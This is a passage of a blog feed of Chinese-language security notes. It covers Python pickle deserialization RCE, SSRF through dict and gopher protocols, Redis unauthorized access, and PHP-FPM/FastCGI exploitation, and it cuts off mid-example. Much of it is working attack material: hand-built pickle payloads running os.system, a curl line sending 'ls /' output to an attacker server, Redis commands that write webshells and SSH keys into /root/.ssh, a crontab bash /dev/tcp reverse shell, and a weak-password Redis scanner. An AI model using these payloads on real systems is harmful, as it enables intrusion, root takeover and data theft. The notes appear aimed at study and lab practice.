class=\"line\">b&#x27;\\x80\\x03c__main__\\nflag\\nq\\x00)\\x81q\\x01.&#x27;</span><br><span class=\"line\">    0: \\x80 PROTO      3</span><br><span class=\"line\">    2: c    GLOBAL     &#x27;__main__ flag&#x27;</span><br><span class=\"line\">   17: q    BINPUT     0</span><br><span class=\"line\">   19: )    EMPTY_TUPLE</span><br><span class=\"line\">   20: \\x81 NEWOBJ</span><br><span class=\"line\">   21: q    BINPUT     1</span><br><span class=\"line\">   23: .    STOP</span><br><span class=\"line\">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>\n<p>根据 BUILD 的说明，我们需要构造一个字典</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03c__main__\\nflag\\nq\\x00)\\x81&#125;.&#x27;</span><br></pre></td></tr></table></figure>\n<p>接下来往字典里放值，先放一个 mark</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03c__main__\\nflag\\nq\\x00)\\x81&#125;(.&#x27;</span><br></pre></td></tr></table></figure>\n<p>放键值对</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03c__main__\\nflag\\nq\\x00)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nu.&#x27;</span><br></pre></td></tr></table></figure>\n<p>第一次 BUILD</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03c__main__\\nflag\\nq\\x00)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nub.&#x27;</span><br></pre></td></tr></table></figure>\n<p>放参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03c__main__\\nflag\\nq\\x00)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nubVwhoami\\n.&#x27;</span><br></pre></td></tr></table></figure>\n<p>第二次 BUILD</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03c__main__\\nflag\\nq\\x00)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nubVwhoami\\nb.&#x27;</span><br></pre></td></tr></table></figure>\n<p>完成</p>\n<p>一些补充的细节</p>\n<blockquote>\n<p><strong>一</strong>、** 其他模块的 load 也可以触发 pickle 反序列化漏洞。** 例如： <code>numpy.load()</code>  先尝试以 numpy 自己的数据格式导入；如果失败，则尝试以 pickle 的格式导入。因此 <code>numpy.load()</code>  也可以触发 pickle 反序列化漏洞。</p>\n<p>二、即使代码中没有 <code>import os</code> ，<strong>GLOBAL 指令也可以自动导入 <code>os.system</code> </strong>。因此，不能认为 “我不在代码里面导入 os 库，pickle 反序列化的时候就不能执行 os.system”。</p>\n<p>三、** 即使没有回显，也可以很方便地调试恶意代码。** 只需要拥有一台公网服务器，执行 <code>os.system('curl your_server/</code> ls / | base64 <code>)</code> ，然后查询您自己的服务器日志，就能看到结果。这是因为：以 ``` 引号包含的代码，在 sh 中会直接执行，返回其结果。</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI2NDM2My5odG1s\">Python pickle 反序列化详解 - FreeBuf 网络安全行业门户</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC84OTEzMjc2OA==\">从零开始 python 反序列化攻击：pickle 原理解析 &amp; 不用 reduce 的 RCE 姿势 - 知乎 (zhihu.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9taXNha2lrYXRhLmdpdGh1Yi5pby8yMDIwLzA0L3B5dGhvbi0lRTUlOEYlOEQlRTUlQkElOEYlRTUlODglOTclRTUlOEMlOTYv\">python 反序列化～Misaki’s Blog (misakikata.github.io)</span></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/06/27/SSRF/",
            "url": "http://example.com/2022/06/27/SSRF/",
            "title": "SSRF",
            "date_published": "2022-06-27T05:38:45.000Z",
            "content_html": "<h2 id=\"ssrf\"><a class=\"markdownIt-Anchor\" href=\"#ssrf\">#</a> SSRF</h2>\n<h3 id=\"前置知识\"><a class=\"markdownIt-Anchor\" href=\"#前置知识\">#</a> 前置知识</h3>\n<h4 id=\"1dict协议\"><a class=\"markdownIt-Anchor\" href=\"#1dict协议\">#</a> 1.dict 协议</h4>\n<blockquote>\n<p>dict 协议是一个在线网络字典协议，这个协议是用来架设一个字典服务的。可以看到用这个协议架设的服务可以用 telnet 来登陆，说明这个协议应该是基于 tcp 协议开发的。</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">telnet dict.org 2628</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220325164738004.png\" alt=\"image-20220325164738004\"></p>\n<p>我们输入  <code>define [字典名] [单词]</code>  这样的命令来获取一个单词的解释</p>\n<p>比如说  <code>define english hello</code></p>\n<p>服务器就会返回对应的单词解释</p>\n<p>对弈一些 <code>tcp</code>  协议，用 <code>dict</code>  方法可以打开，在有 <code>waf</code>  的情况下可以获取一些开放的服务信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">// 文件名: main.php</span><br><span class=\"line\">  </span><br><span class=\"line\">$url = &quot;dict://localhost:3306&quot;; // localhost:3306 上架设了我的 mysql 服务</span><br><span class=\"line\"></span><br><span class=\"line\">$ch = curl_init($url);</span><br><span class=\"line\">curl_exec($ch);</span><br><span class=\"line\">curl_close($ch);</span><br><span class=\"line\"></span><br><span class=\"line\">N 5.5.62-log=gnsw|+\\��!�n5[KF\\&#123;wdo&quot;Umysql_native_password!��#08S01Got packets out of order1</span><br></pre></td></tr></table></figure>\n<p>配合 burpsuite 可以进行端口扫描</p>\n<h4 id=\"gopher协议\"><a class=\"markdownIt-Anchor\" href=\"#gopher协议\">#</a> gopher 协议</h4>\n<p><code>gopher</code>  协议是一种信息查找系统，他将 <code>Internet</code>  上的文件组织成某种索引，方便用户从 <code>Internet</code>  的一处带到另一处。在 <code>WWW</code>  出现之前， <code>Gopher</code>  是 <code>Internet</code>  上最主要的信息检索工具，Gopher 站点也是最主要的站点，使用 <code>tcp70</code>  端口。但在 <code>WWW</code>  出现后， <code>Gopher</code>  失去了昔日的辉煌。现在它基本过时，人们很少再使用它。</p>\n<p><code>gopher</code>  协议格式: <code>gopher://IP:port/_&#123;TCP/IP数据流&#125;</code></p>\n<p>gopher 可以接收 get 和 post 请求</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl gopher://192.168.109.166:80/_GET%20/get.php%3fparam=Konmu%20HTTP/1.1%0d%0aHost:192.168.109.166%0d%0a</span><br><span class=\"line\">curl gopher://192.168.194.1:80/_POST%20/post.php%20HTTP/1.1%0d%0AHost:192.168.194.1%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:12%0d%0A%0d%0Aname=purplet%0d%0A</span><br></pre></td></tr></table></figure>\n<p>ssrf + gopher 可以实现 Redis 未授权访问</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST与GET传参的区别：它有4个参数为必要参数</span><br><span class=\"line\"></span><br><span class=\"line\">POST /post.php HTTP/1.1</span><br><span class=\"line\">host:192.168.194.1</span><br><span class=\"line\">Content-Type:application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length:12name=purplet</span><br></pre></td></tr></table></figure>\n<h3 id=\"ssrf-redis-未授权访问\"><a class=\"markdownIt-Anchor\" href=\"#ssrf-redis-未授权访问\">#</a> ssrf + Redis 未授权访问</h3>\n<p>攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作</p>\n<p>攻击者可以成功将自己的 ssh 公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器。</p>\n<p>简单说，漏洞的产生条件有以下两点:</p>\n<p>（1）redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网；<br>\n（2）没有设置密码认证（一般为空），可以免密码远程登录 redis 服务。</p>\n<p>1. 启动 redis</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">可以指定配置文件启动(若不指定则以默认的配置文件启动)：</span><br><span class=\"line\">./redis-server /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>\n<p>安全模式起作用需要同时满足俩个条件：</p>\n<p>(1) redis 没有开启登录认证</p>\n<p>(2) redis 没有绑定到某个 ip 地址或 ip 段</p>\n<p>redis 默认是未开启登录认证，开启安全模式的.</p>\n<p>造成未授权访问有两种情况：</p>\n<ol>\n<li>未开启登录验证，并且把 IP 绑定到 0.0.0.0</li>\n<li>未开启登录验证，没有设置绑定 IP， <code>protected-mode</code>  关闭</li>\n</ol>\n<h4 id=\"利用redis写webshell\"><a class=\"markdownIt-Anchor\" href=\"#利用redis写webshell\">#</a> 利用 Redis 写 webshell</h4>\n<p>通过设置目录后写入备份文件中</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20180829154920415-7768410.png\" alt=\"img\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxxxxxxxxx set x &quot;\\n\\n&lt;?php phpinfo();?&gt;\\n\\n&quot;</span><br></pre></td></tr></table></figure>\n<p>用 redis 写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">访问redis.php</span><br></pre></td></tr></table></figure>\n<p>或者使用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">                                                                                                ?&gt;&#x27;);</span><br><span class=\"line\">exit();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"使用公钥私钥获取root权限\"><a class=\"markdownIt-Anchor\" href=\"#使用公钥私钥获取root权限\">#</a> 使用公钥私钥获取 root 权限</h4>\n<p>生成公私钥，默认路径为 /root/.ssh</p>\n<p>本地生成私钥和公钥，将公钥写入备份文件，使用本地私钥登录</p>\n<p><code>ssh-keygen -t rsa</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">修改工作路径</span><br><span class=\"line\">config set dir /root/.ssh</span><br><span class=\"line\">config set dbfilename authorized_keys</span><br><span class=\"line\">set pub &quot;我们刚刚生成的公钥&quot;</span><br><span class=\"line\">登录：ssh -i id_rsa root@172.16.60.166</span><br><span class=\"line\">id -&gt; 得到root</span><br></pre></td></tr></table></figure>\n<h4 id=\"redis未授权访问检测脚本\"><a class=\"markdownIt-Anchor\" href=\"#redis未授权访问检测脚本\">#</a> redis 未授权访问检测脚本</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#! /usr/bin/env python</span><br><span class=\"line\"># _*_  coding:utf-8 _*_</span><br><span class=\"line\">import socket</span><br><span class=\"line\">import sys</span><br><span class=\"line\">PASSWORD_DIC=[&#x27;redis&#x27;,&#x27;root&#x27;,&#x27;oracle&#x27;,&#x27;password&#x27;,&#x27;p@aaw0rd&#x27;,&#x27;abc123!&#x27;,&#x27;123456&#x27;,&#x27;admin&#x27;]</span><br><span class=\"line\">def check(ip, port, timeout):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        socket.setdefaulttimeout(timeout)</span><br><span class=\"line\">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">        s.connect((ip, int(port)))</span><br><span class=\"line\">        s.send(&quot;INFO\\r\\n&quot;)</span><br><span class=\"line\">        result = s.recv(1024)</span><br><span class=\"line\">        if &quot;redis_version&quot; in result:</span><br><span class=\"line\">            return u&quot;未授权访问&quot;</span><br><span class=\"line\">        elif &quot;Authentication&quot; in result:</span><br><span class=\"line\">            for pass_ in PASSWORD_DIC:</span><br><span class=\"line\">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">                s.connect((ip, int(port)))</span><br><span class=\"line\">                s.send(&quot;AUTH %s\\r\\n&quot; %(pass_))</span><br><span class=\"line\">                result = s.recv(1024)</span><br><span class=\"line\">                if &#x27;+OK&#x27; in result:</span><br><span class=\"line\">                    return u&quot;存在弱口令，密码：%s&quot; % (pass_)</span><br><span class=\"line\">    except Exception, e:</span><br><span class=\"line\">        pass</span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    ip=sys.argv[1]</span><br><span class=\"line\">    port=sys.argv[2]</span><br><span class=\"line\">    print check(ip,port, timeout=10)</span><br></pre></td></tr></table></figure>\n<h4 id=\"利用任务计划反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#利用任务计划反弹shell\">#</a> 利用任务计划反弹 shell</h4>\n<p>攻击者监听端口</p>\n<p><code>nc -lvnp 4444</code></p>\n<p>将备份放入任务计划中，同时将 crontab 内容写入文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set xxx &quot;\\n\\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/172.16.60.199/1234 0&gt;&amp;1\\n\\n&quot;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">config set dir /var/spool/cron </span><br><span class=\"line\">config set dbfilename  root</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n<p>在反弹的 shell 中可以看数据库连接文件等，同时谁启动的 Redis 反弹就是谁的权限</p>\n<h4 id=\"利用ssrf中curl函数请求redis未授权访问\"><a class=\"markdownIt-Anchor\" href=\"#利用ssrf中curl函数请求redis未授权访问\">#</a> 利用 ssrf 中 curl 函数请求 Redis 未授权访问</h4>\n<p>gopher 协议支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，在构成符合 gopher 协议的请求。gopher 协议是 ssrf 利用中最强大的协议。而 curl_exec 也是 tcp 的因此可以实现</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1nb3BoZXJ1cy11dTdtNTMwMGEucHk=\">利用 gopherus.py</span></p>\n<p>写入 webshell / 反弹 webshell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python gopherus.py --exploit redis </span><br><span class=\"line\">phpwebshell/reverseshell</span><br><span class=\"line\">需要写入的payload</span><br><span class=\"line\">得到最终的payload</span><br></pre></td></tr></table></figure>\n<p>注意：最后得到的 payload 如果从 url 输入需要二次编码，但使用 curl 命令就不需要</p>\n<p>两次因为 gopher 解码一次，url 解码一次</p>\n<h3 id=\"fastcgifpm未授权访问\"><a class=\"markdownIt-Anchor\" href=\"#fastcgifpm未授权访问\">#</a> FastCGI，FPM 未授权访问</h3>\n<p>前置知识</p>\n<p>1.fastcgi &amp;&amp; fastcgi record</p>\n<p>Fastcgi 其实是一个通信协议，和 HTTP 协议一样，都是进行数据交换的一个通道。</p>\n<p>fastcgi 协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi 协议由多个 record 组成，record 也有 header 和 body 一说，服务器中间件将这二者按照 fastcgi 的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p>\n<p>record 组成如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typedef struct &#123;</span><br><span class=\"line\">  /* Header */</span><br><span class=\"line\">  unsigned char version; // 版本</span><br><span class=\"line\">  unsigned char type; // 本次record的类型</span><br><span class=\"line\">  unsigned char requestIdB1; // 本次record对应的请求id</span><br><span class=\"line\">  unsigned char requestIdB0;</span><br><span class=\"line\">  unsigned char contentLengthB1; // body体的大小</span><br><span class=\"line\">  unsigned char contentLengthB0;</span><br><span class=\"line\">  unsigned char paddingLength; // 额外块大小</span><br><span class=\"line\">  unsigned char reserved; </span><br><span class=\"line\"></span><br><span class=\"line\">  /* Body */</span><br><span class=\"line\">  unsigned char contentData[contentLength];</span><br><span class=\"line\">  unsigned char paddingData[paddingLength];</span><br><span class=\"line\">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure>\n<p>头由 8 个 uchar 类型的变量组成，每个变量 1 字节。其中， <code>requestId</code>  占两个字节，一个唯一的标志 id，以避免多个请求之间的影响； <code>contentLength</code>  占两个字节，表示 body 的大小。</p>\n<p>语言端解析了 fastcgi 头以后，拿到 <code>contentLength</code> ，然后再在 TCP 流里读取大小等于 <code>contentLength</code>  的数据，这就是 body 体。一个 fastcgi record 结构最大支持的 body 大小是 <code>2^16</code> ，也就是 65536 字节。</p>\n<p>2.fastcgi type</p>\n<p><code>type</code>  就是指定该 record 的作用。因为 fastcgi 一个 record 的大小是有限的，作用也是单一的，所以我们需要在一个 TCP 流里传输多个 record。通过 <code>type</code>  来标志每个 record 的作用，用 <code>requestId</code>  作为同一次请求的 id。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/e29518b1-3574-426f-b75f-8cabbb89a15a.9efc537226ce.jpg\" alt=\"14931267923354.jpg\"></p>\n<p>看了这个表格就很清楚了，服务器中间件和后端语言通信，第一个数据包就是 <code>type</code>  为 1 的 record，后续互相交流，发送 <code>type</code>  为 4、5、6、7 的 record，结束时发送 <code>type</code>  为 2、3 的 record。</p>\n<p>3.php fpm</p>\n<p>FPM 其实是一个 fastcgi 协议解析器，Nginx 等服务器中间件将用户请求按照 fastcgi 的规则打包好通过 TCP 传给谁？其实就是传给 FPM。</p>\n<p>用户访问 <code>http://127.0.0.1/index.php?a=1&amp;b=2</code> ，如果 web 目录是 <code>/var/www/html</code> ，那么 Nginx 会将这个请求变成如下 key-value 对：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class=\"line\">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class=\"line\">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class=\"line\">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class=\"line\">    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,</span><br><span class=\"line\">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,</span><br><span class=\"line\">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class=\"line\">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class=\"line\">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class=\"line\">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>PHP-FPM 拿到 fastcgi 的数据包后，进行解析，得到上述这些环境变量。然后，执行 <code>SCRIPT_FILENAME</code>  的值指向的 PHP 文件，也就是 <code>/var/www/html/index.php</code> 。</p>\n<h4 id=\"iis70解析漏洞\"><a class=\"markdownIt-Anchor\" href=\"#iis70解析漏洞\">#</a> IIS7.0 解析漏洞</h4>\n<p>漏洞现象是，在用户访问 <code>http://127.0.0.1/favicon.ico/.php</code>  时，访问到的文件是 favicon.ico，但却按照.php 后缀解析了。</p>\n<p>用户请求 <code>http://127.0.0.1/favicon.ico/.php</code> ，nginx 将会发送如下环境变量到 fpm 里：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/favicon.ico/.php&#x27;,</span><br><span class=\"line\">    &#x27;SCRIPT_NAME&#x27;: &#x27;/favicon.ico/.php&#x27;,</span><br><span class=\"line\">    &#x27;REQUEST_URI&#x27;: &#x27;/favicon.ico/.php&#x27;,</span><br><span class=\"line\">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>正常来说， <code>SCRIPT_FILENAME</code>  的值是一个不存在的文件 <code>/var/www/html/favicon.ico/.php</code> ，是 PHP 设置中的一个选项 <code>fix_pathinfo</code>  导致了这个漏洞。PHP 为了支持 Path Info 模式而创造了 <code>fix_pathinfo</code> ，在这个选项被打开的情况下，fpm 会判断 <code>SCRIPT_FILENAME</code>  是否存在，如果不存在则去掉最后一个 <code>/</code>  及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。</p>\n<p>所以，第一次 fpm 发现 <code>/var/www/html/favicon.ico/.php</code>  不存在，则去掉 <code>/.php</code> ，再判断 <code>/var/www/html/favicon.ico</code>  是否存在。显然这个文件是存在的，于是被作为 PHP 文件执行，导致解析漏洞。</p>\n<p>正确的解决方法有两种，一是在 Nginx 端使用 <code>fastcgi_split_path_info</code>  将 path info 信息去除后，用 tryfiles 判断文件是否存在；二是借助 PHP-FPM 的 <code>security.limit_extensions</code>  配置项，避免其他后缀文件被解析。</p>\n<h4 id=\"fastcgi-未授权访问\"><a class=\"markdownIt-Anchor\" href=\"#fastcgi-未授权访问\">#</a> fastcgi 未授权访问</h4>\n<p><strong>PHP-FPM 默认监听 9000 端口，如果这个端口暴露在公网，则我们可以自己构造 fastcgi 协议，和 fpm 进行通信。</strong></p>\n<p><code>SCRIPT_FILENAME</code>  的值就格外重要了。因为 fpm 是根据这个值来执行 php 文件的，如果这个文件不存在，fpm 会直接返回 404：</p>\n<p>由于设置了 security.limit_extensions，其限定了只有某些后缀的文件允许被 fpm 执行，默认是 <code>.php</code> 。</p>\n<p>由于这个配置项的限制，如果想利用 PHP-FPM 的未授权访问漏洞，首先就得找到一个已存在的 PHP 文件。</p>\n<p>我们可以找找默认源安装后可能存在的 php 文件，比如 <code>/usr/local/lib/php/PEAR.php</code> 。</p>\n<p>PHP.INI 中有两个有趣的配置项， <code>auto_prepend_file</code>  和 <code>auto_append_file</code> 。</p>\n<p><code>auto_prepend_file</code>  是告诉 PHP，在执行目标文件之前，先包含 <code>auto_prepend_file</code>  中指定的文件； <code>auto_append_file</code>  是告诉 PHP，在执行完成目标文件后，包含 <code>auto_append_file</code>  指向的文件。</p>\n<p>那么就有趣了，假设我们设置 <code>auto_prepend_file</code>  为 <code>php://input</code> ，那么就等于在执行任何 php 文件前都要包含一遍 POST 的内容。所以，我们只需要把待执行的代码放在 Body 中，他们就能被执行了。（当然，还需要开启远程文件包含选项 <code>allow_url_include</code> ）</p>\n<p>那么，我们怎么设置 <code>auto_prepend_file</code>  的值？</p>\n<p>这又涉及到 PHP-FPM 的两个环境变量， <code>PHP_VALUE</code>  和 <code>PHP_ADMIN_VALUE</code> 。这两个环境变量就是用来设置 PHP 配置项的， <code>PHP_VALUE</code>  可以设置模式为 <code>PHP_INI_USER</code>  和 <code>PHP_INI_ALL</code>  的选项， <code>PHP_ADMIN_VALUE</code>  可以设置所有选项。（ <code>disable_functions</code>  除外，这个选项是 PHP 加载的时候就确定了，在范围内的函数直接不会被加载到 PHP 上下文中）</p>\n<p>所以，我们最后传入如下环境变量：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class=\"line\">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class=\"line\">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class=\"line\">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class=\"line\">    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,</span><br><span class=\"line\">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,</span><br><span class=\"line\">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class=\"line\">    &#x27;SERVER_SOFTWARE&#x27;: 